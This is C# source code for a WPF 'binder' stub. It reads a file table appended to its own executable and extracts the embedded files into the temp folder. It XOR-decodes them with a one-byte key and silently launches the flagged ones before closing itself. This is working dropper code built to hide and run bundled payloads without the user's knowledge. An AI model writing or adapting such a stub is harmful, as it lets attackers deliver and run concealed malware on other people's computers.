using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;

namespace Zcy_Binder
{
    //文件索引“********（8字节，表示文件起始位置）********（8字节，表示文件大小）”
    struct FileIndex
    {
        public long StartPos;
        public long FileSize;
        public string Extention;
        public string IsStart;
    }

    /// <summary>
    /// MainWindow.xaml 的交互逻辑
    /// </summary>
    public partial class MainWindow : Window
    {
        private List<FileIndex> fileTable = new List<FileIndex>();

        public MainWindow()
        {
            InitializeComponent();
        }

        private void Window_Loaded(object sender, RoutedEventArgs e)
        {
            try
            {
                long fileTableStartPos = long.Parse(GlobalVars.FileTableStartPos.Trim());
                //MessageBox.Show(fileTableStartPos.ToString());
                //复制自身到临时目录
                string tempPath = System.IO.Path.GetTempPath();//有斜杠
                string currentPath = Process.GetCurrentProcess().MainModule.FileName;
                string tempFileName = tempPath + @"84537453833273462356677.exe";
                File.Copy(currentPath, tempFileName, true);
                //提取捆绑文件的个数
                FileStream fs = new FileStream(tempFileName, FileMode.Open);
                byte[] bytesFile = new byte[fs.Length];
                fs.Read(bytesFile, 0, bytesFile.Length);
                byte[] bytesFileNum = new byte[4];
                Array.Copy(bytesFile, fileTableStartPos, bytesFileNum, 0, 4);
                int fileNum = BitConverter.ToInt32(bytesFileNum, 0);


                //检索文件索引表
                for (int i = 0; i < fileNum; i++)
                {
                    FileIndex fi = new FileIndex();
                    //提取开始位置
                    byte[] bytesStartPos = new byte[8];
                    Array.Copy(bytesFile, fileTableStartPos + 4 + 38 * i, bytesStartPos, 0, 8);
                    fi.StartPos = BitConverter.ToInt64(bytesStartPos, 0);
                    //MessageBox.Show(fi.StartPos.ToString());
                    //提取文件大小
                    byte[] bytesFileSize = new byte[8];
                    Array.Copy(bytesFile, fileTableStartPos + 4 + 8 + 38 * i, bytesFileSize, 0, 8);
                    fi.FileSize = BitConverter.ToInt64(bytesFileSize, 0);
                    //MessageBox.Show(fi.FileSize.ToString());
                    //提取后缀名
                    byte[] bytesExtention = new byte[20];
                    Array.Copy(bytesFile, fileTableStartPos + 4 + 8 + 8 + 38 * i, bytesExtention, 0, 20);
                    fi.Extention = (Encoding.Unicode.GetString(bytesExtention)).Trim();
                    //MessageBox.Show(fi.Extention);
                    //提取是否执行
                    byte[] bytesIsStart = new byte[2];
                    Array.Copy(bytesFile, fileTableStartPos + 4 + 8 + 8 + 20 + 38 * i, bytesIsStart, 0, 2);
                    fi.IsStart = (Encoding.Unicode.GetString(bytesIsStart)).Trim();
                    //MessageBox.Show(fi.IsStart);

                    this.fileTable.Add(fi);
                }

                //开始释放执行
                foreach (FileIndex item in this.fileTable)
                {
                    //从主程序提取文件并释放出来
                    string fullFileName = tempPath + @"binder_" + item.StartPos + "." + item.Extention;
                    FileStream fs1 = new FileStream(fullFileName, FileMode.Create);
                    byte[] bytesFile1 = new byte[item.FileSize];
                    Array.Copy(bytesFile, item.StartPos, bytesFile1, 0, bytesFile1.Length);
                    //解密
                    bytesFile1 = this.EncodeOrDecode(bytesFile1, 0x01);

                    fs1.Write(bytesFile1, 0, bytesFile1.Length);
                    fs1.Close();
                    //执行

                    if (item.IsStart == "1")
                    {
                        this.StartExe(fullFileName);
                    }
                }

                //退出自身
                this.Close();
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.StackTrace);
            }
        }

        /// <summary>
        /// 用给定的KDC密钥异或加密(解密同样可以用此方法)
        /// </summary>
        /// <param name="bytes">待加密的字节集</param>
        /// <param name="KDC">加密密钥</param>
        /// <returns>返回加密后的字节集</returns>
        private byte[] EncodeOrDecode(byte[] bytes, int KDC)
        {

            for (int i = 0; i < bytes.Length; i++)
            {
                bytes[i] = (byte)(bytes[i] ^ KDC);
            }

            return bytes;
        }

        /// <summary>
        /// 启动外部程序，异步（完全脱离主程序），不等待其退出
        /// </summary>
        /// <param name="exeName">exe文件全文件名</param>
        /// <param name="strs">参数</param>
        private void StartExe(string exeName, params string[] strs)
        {
            string args = string.Empty;
            foreach (string str in strs)
            {
                args += str + " ";
            }
            Process.Start(exeName, args);
        }
    }
}
